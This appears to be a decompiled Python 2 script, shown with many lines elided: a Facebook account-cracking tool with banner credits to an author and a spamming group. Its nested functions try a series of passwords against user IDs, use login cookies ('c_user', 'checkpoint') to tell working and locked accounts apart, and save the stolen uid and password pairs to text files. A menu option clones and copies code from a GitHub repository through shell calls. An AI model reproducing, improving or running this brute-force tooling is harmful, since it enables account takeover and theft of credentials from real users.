# Decompile by Mardis (Tools By HASAN_VAU)
...
'\x1b[1;91m'====================================================
'\x1b[1;92m'   Author     :     乂ᴹᴿ ᭄✿ʜᴀsᴀɴ࿐ 
'\x1b[1;93m'   FB ID       :     Hasa N
'\x1b[1;94m'   TOOL TYPE   :  ONLY FREE COMMANDS🤟
'\x1b[1;91m'==================================================== 
'\x1b[1;92m'_________HasaN_UR_Abbu
'\x1b[1;93m'====================================================
'\x1b[1;94m'Fd Group      : Kg Sapmming Team
'\x1b[1;95m' LOVE YOU ALL VAI BROTHER💚💛
 '\x1b[1;96m'====================================================              
"""
dec="2"
server="2"
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In HASAN Paid Commands ")
        print ("        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/jahied/FREE3")
        os.system("rm -rf FREE3")
        os.system("cp -f FREE3/FREE3 \\.")
        os.system("rm -rf FREE3")
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[HASAN-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[HASAN-CP] "+coc+user + " | " + pass1
                    cp=open('HASAN random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    print g+"[=] Extracting From HASAN : "+my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[HASAN-OK] "+uid + " | " + pass1
                ok=open('HASAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[HASAN-CP] "+uid + " | " + pass1
                    cp=open('HASAN-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[HASAN-OK] "+uid + " | " + pass2
                        ok=open('HASAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[HASAN-CP] "+uid + " | " + pass2
                            cp=open('HASAN-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[HASAN-OK] "+uid + " | " + pass3
                                ok=open('HASAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[HASAN-CP] "+uid + " | " + pass3
                                    cp=open('HASAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[HASAN-OK] "+uid + " | " + pass4
                                        ok=open('HASAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;97m[HASAN-CP] "+uid + " | " + pass4
                                            cp=open('HASAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[HASAN-OK] "+uid + " | " + pass5
                                                ok=open('HASAN-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[HASAN-CP] "+uid + " | " + pass5
                                                    cp=open('HASAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[HASAN-OK] "+uid + " | " + pass6
                                                        ok=open('HASAN-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;97m[HASAN-CP] "+uid + " | " + pass6
                                                            cp=open('HASAN-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
